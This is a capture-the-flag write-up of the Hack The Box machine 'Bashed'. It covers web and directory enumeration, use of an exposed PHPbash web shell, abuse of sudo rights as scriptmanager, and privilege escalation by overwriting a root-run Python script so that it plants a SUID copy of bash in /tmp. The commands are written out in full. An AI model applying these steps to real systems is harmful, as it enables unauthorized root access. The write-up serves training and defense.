# Hack The Box - Bashed

> Linux • Easy

* * *

## Summary

Bashed was a Linux machine that reinforces the importance of reading the web application closely instead of only relying on automated tools.

The machine started with a single exposed HTTP service. The website referenced PHPbash, which became really helpful during enumeration. Directory brute forcing identified an exposed `/dev` directory containing `phpbash.php`, which provided command execution as `www-data`.


* * *

# Enumeration

I started with a standard Nmap scan:

    nmap -sS -sV -sC 10.129.1.248

The scan identified:

  * Port 80 HTTP
  * Apache httpd 2.4.18
  * Ubuntu backend

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

## Nmap Scan

<img width="861" height="393" alt="image" src="https://github.com/user-attachments/assets/e6ea8f2a-e476-4ebe-a461-937452d3f354" />



* * *

# Web Enumeration

Browsing to the web page showed a blog-style site. One of the posts referenced **PHPbash**, which was described as a semi-interactive web shell.

Key factors that stood out:

  * the box name was Bashed
  * the website directly referenced PHPbash
  * PHPbash is a web shell
  * the target only exposed HTTP

Instead of treating the page as normal blog content, I approached it from the angle of things may be left behind on the server

## Browser Enumeration

<img width="1893" height="836" alt="image" src="https://github.com/user-attachments/assets/854f577e-70f5-49f0-964e-ca3dd6600dba" />


I then shifted to directory enumeration to attempt to expose any other potential directories available. 

* * *

# Directory Enumeration

I used Gobuster to search for web directories and PHP-related files:

    gobuster dir -u http://10.129.1.248 \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -x php,txt,html \
    -t 40

The scan identified several paths:

    /about.html       Status: 200
    /config.php       Status: 200
    /contact.html     Status: 200
    /css              Status: 301
    /dev              Status: 301
    /fonts            Status: 301
    /images           Status: 301
    /index.html       Status: 200
    /index.htm        Status: 200
    /js               Status: 301
    /php              Status: 301
    /server-status    Status: 403
    /single.html      Status: 200
    /uploads          Status: 301

The `/dev` directory immediately stood out because the web page had already referenced PHPbash and web shell development.

## Gobuster Results

<img width="856" height="768" alt="image" src="https://github.com/user-attachments/assets/12d7227b-7df1-4c82-a82e-cd6154580511" />


* * *

# Discovering PHPbash

The `/dev` directory was one of the most appealing because being on the web server itself I viewed it as development rather than the traditional Linux /dev :

    http://10.129.1.248/dev/

Directory listing was enabled and revealed two PHPbash files:

    phpbash.min.php
    phpbash.php

This confirmed that the PHPbash web shell referenced on the site was actually exposed on the server.

The relative path to the folder containing `phpbash.php` was:

    /dev/

## Directory Listing

<img width="648" height="423" alt="image" src="https://github.com/user-attachments/assets/11f13283-1e40-4d3a-8302-4ef3bf892e16" />


* * *

# Initial Foothold

I opened the PHPbash web shell:

    http://10.129.1.248/dev/phpbash.php

The web shell provided command execution through the browser.

I confirmed the current user:

    whoami

The output showed:

    www-data

I also checked the system information:

    uname -a

The shell was running in the context of the Apache web server user, which confirmed initial access but not elevated privileges.

## PHPbash Shell

<img width="991" height="265" alt="image" src="https://github.com/user-attachments/assets/6bddc1f5-b82a-48b9-b505-6cabd9908cb3" />

* * *

# User Flag

From the PHPbash shell, I enumerated the home directory:

    ls -la /home

The system contained two user directories:

    arrexel
    scriptmanager

I checked the `arrexel` user's home directory:

    ls -la /home/arrexel

The directory contained `user.txt`.

My first attempt to read the flag failed because I was still in the web directory:

    cat user.txt

That returned:

    No such file or directory

Using the absolute path worked:

    cat /home/arrexel/user.txt

This retrieved the user flag.

## User Flag

<img width="589" height="328" alt="image" src="https://github.com/user-attachments/assets/8ee4426a-4623-4b0a-8714-6250c7647a58" />


* * *

# Local Enumeration

After retrieving the user flag, I checked sudo permissions for `www-data`:

    sudo -l

The output showed:

    User www-data may run the following commands on bashed:
        (scriptmanager : scriptmanager) NOPASSWD: ALL

This was a major finding. The web server user could execute commands as `scriptmanager` without a password.

I verified this with:

    sudo -u scriptmanager whoami

The output returned:

    scriptmanager

I attempted to spawn a shell as `scriptmanager`:

    sudo -u scriptmanager /bin/bash

However, because PHPbash is a command-by-command web shell, the interactive shell did not persist. Running `whoami` afterward still showed:

    www-data

Instead of relying on an interactive shell, I continued executing commands as `scriptmanager` by prefixing them with:

    sudo -u scriptmanager

## Sudo Permissions

<img width="986" height="172" alt="image" src="https://github.com/user-attachments/assets/b939dbc9-4af1-4f5d-a7ad-18e3af656abb" />


* * *

# Privilege Escalation Enumeration

I listed the system root as `scriptmanager`:

    sudo -u scriptmanager ls -la /

One directory stood out:

    drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts

The folder that `scriptmanager` could access from the system root was:

    /scripts

This was interesting because it was not a standard Linux directory and it was owned by the `scriptmanager` user.

## Scripts Directory Discovery

<img width="894" height="571" alt="image" src="https://github.com/user-attachments/assets/f72c1b8e-3dd7-4a16-943c-d7ed36919700" />


* * *

# Inspecting /scripts

I listed the contents of `/scripts`:

    sudo -u scriptmanager ls -la /scripts

The directory contained:

    test.py
    test.txt

The permissions and ownership were important:

    -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
    -rw-r--r-- 1 root          root          12 May 22 11:12 test.txt

The file being executed was:

    test.py

I inspected the Python file:

    sudo -u scriptmanager cat /scripts/test.py

The script contained:

    f = open("test.txt", "w")
    f.write("testing 123!")
    f.close

This was suspicious because `test.py` was owned by `scriptmanager`, but `test.txt` was owned by root. Since the Python script wrote to `test.txt`, this suggested that root was likely executing `test.py` on a schedule.

## test.py Discovery

<img width="680" height="195" alt="image" src="https://github.com/user-attachments/assets/b3ad437e-cd55-4b16-81c1-87f4d8b01609" />


* * *

# Privilege Escalation

Because I could run commands as `scriptmanager`, and `scriptmanager` owned `test.py`, I modified the script so that when root executed it, it would create a SUID root copy of Bash.

I overwrote `test.py` with:

    sudo -u scriptmanager bash -c 'printf "import os\nos.system(\"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\")\n" > /scripts/test.py'

I verified the modified script:

    sudo -u scriptmanager cat /scripts/test.py

The file now contained:

    import os
    os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")

After waiting for the scheduled task to execute, I checked `/tmp`:

    ls -la /tmp/rootbash

The binary was created as root with the SUID bit set.

I then executed it using the `-p` option to preserve the effective UID:

    /tmp/rootbash -p

After that, I confirmed root access:

    whoami
    id

The output confirmed:

    root

* * *

# Root Access

With root-level command execution, I retrieved the root flag:

    cat /root/root.txt

## Root Flag

<img width="1807" height="303" alt="image" src="https://github.com/user-attachments/assets/d3244625-2745-4c07-a714-b2255c6896af" />


* * *



# Takeaways

  * Web content shouldn't be overlooked and can provide important exploitation clues.
  * Directory enumeration is powerful.
  * Exposed development folders can quickly lead to compromise.
  * Web shells should never be left in production web directories.
  * Sudo rules for service accounts should be extremely limited.
  * A writable script executed by root is a direct privilege escalation path.
